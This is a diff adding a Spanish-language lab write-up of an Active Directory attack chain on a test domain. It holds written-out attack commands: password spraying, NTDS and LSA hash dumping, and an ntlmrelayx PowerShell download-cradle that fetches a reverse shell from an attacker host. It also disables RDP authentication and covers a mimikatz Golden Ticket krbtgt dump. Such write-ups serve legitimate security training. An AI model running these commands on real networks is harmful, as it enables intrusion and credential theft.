@@ -219,5 +219,104 @@ for rid in $(proxychains rpcclient -U '(dominio)\(usuario)%contraseña' 192.168.
 ```
 En nuestro caso en dominio hemos puesto `visma.local`, en usuario `iabjijalazhari` y en contraseá la que nos dio anteriormente `baseball1?` tal que quedaria asi: `'vimsa.local\iabjijalazhari%baseball1?'`
 
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/54bb5a73-dc49-4b8e-a330-20c6fe90b2a5)
+
+Hacemos un password spraying y encontramos que nos aparece Pnwd! En todos, eso quiere decir que tenemos permisos de administrador en todos los dispositivos utiliazando el comando:
+
+```
+proxychain crackmpexec smb 192.168.2.0/24 -u 'test' -p 'P$$w0rd' 2>/dev/null | grep -v 'wisma'
+```
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/e57929ab-4264-491b-8510-bb9d9889be78)
+
+Así que vamos a dumpear el ntds (el ntds es el servicio de directorio de Microsoft que almacena información sobre los objetos en una red y hace posible su búsqueda y administración) y ya tenemos el hash de el usuario Administrador.
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/ac251807-6b8d-40c5-bc71-56ec59016c0f)
+
+Aunque como veréis a continuación también podemos dumpear los hashes NTLM mediante el ntlmrelay y el responder con el smb y http desactivado
 
 
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/4b648d1d-d3e2-4128-b5e5-1293caa85cc2)
+
+Intentamos romper la contraseña con john de nuevo y la contraseña es ‘baseball1*’
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/0b268423-ed5c-4816-be95-9f96d1fdfb1c)
+
+Una vez lo tenemos, dumpeamos el lsa (Local Security Authority   este es un proceso en el sistema operativo Windows que administra aspectos relacionados con la seguridad local) y con esto y el ntds tenemos todos los hashes tanto de usuarios del dominio como de usuarios locales.
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/3b56f14f-881d-4cfc-8f45-d7fe9222310b)
+
+Copiamos el script de reverseshell de powershell a la Aragog, con `cp Invoke-PowerShellTcp.ps1 PS.ps1`.
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/82ffbad9-1130-4a18-b1ed-d922373c8c2d)
+
+Modificamos el PS.ps1 haciendio un `sudo nano PS.ps1` y le ponemos la dirección ip de la Aragog y el puerto que deseemos
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/07c7514c-3707-4065-9e58-7a0a77b5d318)
+
+Empezamos un servicio web con Python por el puerto 8000 para poder acceder al PS.ps1.
+
+```
+python3 -m http.server
+```
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/ba21efd5-2616-4564-b3f1-db929099f8bc)
+
+Ejecutamos el responder con los parámetros -wdv y con el smb y http desactivados.
+
+```
+python2 Responder.py -I enp0s8 -wdv
+```
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/2abf91f8-c287-4555-a0c6-f74e347ba776)
+
+En el ntlm relay, le decimos cuando consiga credenciales, las utilize para autenticarse contra otro equipo dentro del relay.list y que inyecte un comando que nos permite descargarnos el PS.ps1 y ejecutarlo.
+Encontramos que el ntlmrelay.py detecta trafico smb hacia un host inexistente o inactivo y lo redirige hacia el, por lo que le inyecta los comandos:
+
+```
+python3 examples/ntlmrelayx.py -tf ../relay.list -smbsupport -c "powershell IEX(New-Object Net.WebClient). downloadString('http://192.168.2.42:8000/PS.ps1')"
+```
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/0b02c5ce-dcc3-467d-bd34-0eb207995cff)
+
+Vemos que se ha hecho una petición GET al servicio WEB al PS.ps1, con `python3 -m http.server`.
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/3e2bad82-bd49-4dfe-a05e-787b50884af5)
+
+Como podemos ver, estábamos en escucha con el puerto 2121 con netcat y hemos recibido una reverse shell
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/ee0c3e30-62bf-488d-930b-53c93152f4cc)
+
+Una vez estamos dentro, habilitamos el escritorio remoto sin autenticación a nivel de red. 
+
+```
+nc -nlvp 2121
+```
+
+```
+reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+```
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/2588e4ea-aa1e-4b9e-b7bd-0c2b32214ab4)
+
+Una vez hemos hecho esto, intentamos conectarnos con rdp a la ip de la máquina y lo conseguimos, `con proxychains rdesktop 192.168.2.40 (ip de la máquina)`.
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/ed3f8aa2-439d-4267-a157-70e857b2175e)
+
+Iniciamos sessión, y logramos entrar en ella.
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/9e39f091-e5a2-407c-884a-ed29f5dc8db6)
+
+Ahora vamos a por un Golden Ticket Attack, para ello recibimos una shell de el dc mediante psexec, una vez dentro, creamos una carpeta llamada test dentro de “C:\Windows\Temp”
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/0c2a311b-29ab-41e4-806d-6fb075161bec)
+
+Una vez dentro, mediante la utilizad “certutil.exe” (se utiliza para descargar un archivo desde una URL especificada y almacenarlo en la caché de certificados de Windows) descargamos el mimikatz mediante un servicio web expuesto en el puerto 2121 por la aragog.
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/894302e0-458d-4fa5-b6a0-060a7449f064)
+
+El servicio
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/34302ab8-ded9-4f75-b5d3-af673406237f)
+
+Una vez lo ejecutamos, le ponemos el siguiente comando: “Isadump Isa /inject /name:krbtgt” extraer información sobre la cuenta de servicio "krbtgt" del sistema de autenticación de Windows, como el hash NTLM de este mismo, el SID del dominio y más.
